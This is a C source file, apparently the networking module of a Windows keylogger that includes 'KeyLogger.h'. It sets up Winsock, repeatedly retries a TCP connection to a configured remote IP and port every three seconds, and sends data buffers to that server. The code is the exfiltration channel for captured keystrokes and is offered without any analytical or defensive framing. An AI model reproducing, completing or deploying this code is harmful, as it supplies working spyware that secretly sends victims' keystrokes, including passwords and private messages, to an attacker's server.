#include "KeyLogger.h"

SOCKET connectSocket = INVALID_SOCKET;

int sendData(char* buffer) {

	int sResult, bSize = (int)strlen(buffer);
	char tmp[2] = "x";

	sResult = send(connectSocket, buffer, bSize, 0);
	
	// MAY NEED FOR SOME SERVER SOCKET IMPLEMENTATION
	/*for (int j = 0; j < bSize; j++) {
		tmp[0] = buff[j];
		sResult = send(connectSocket, tmp, 1, 1);
	}*/

	if (sResult < 0) {
		printf("Send data to server failed with Error : %d\n", WSAGetLastError());
		return -1;
	}

	return 0;

}

int initSocket() {

	WSADATA wsaData;

	int iResult;

	// Initialize Winsock
	// returns zero on success
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with Error : %d\n", WSAGetLastError());
		return -1;
	}

	printf("Initialized WinSock\n");

	
	connectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (connectSocket == INVALID_SOCKET) {
		printf("Creating socket failed with Error : %d\n", WSAGetLastError());
		return -1;
	}

	printf("Socket created successfully\n");

	struct sockaddr_in server;
	server.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
	server.sin_family = AF_INET;
	server.sin_port = htons(PORT_NUMBER);

	// connect to remote server
	// returns zero on success
	int cResult = -1;
	while (cResult == -1){
		cResult  = connect(connectSocket, (struct sockaddr*)&server, sizeof(server));
		Sleep(3000);
	}
	

	if (cResult != 0) {
		printf("Connect to server failed with Error : %d\n", WSAGetLastError());
		return -1;
	}

	printf("Scoket connnected successfully\n");

	return 0;
}

int closeSocket() {

	closesocket(connectSocket);
	WSACleanup();
	return 0;
}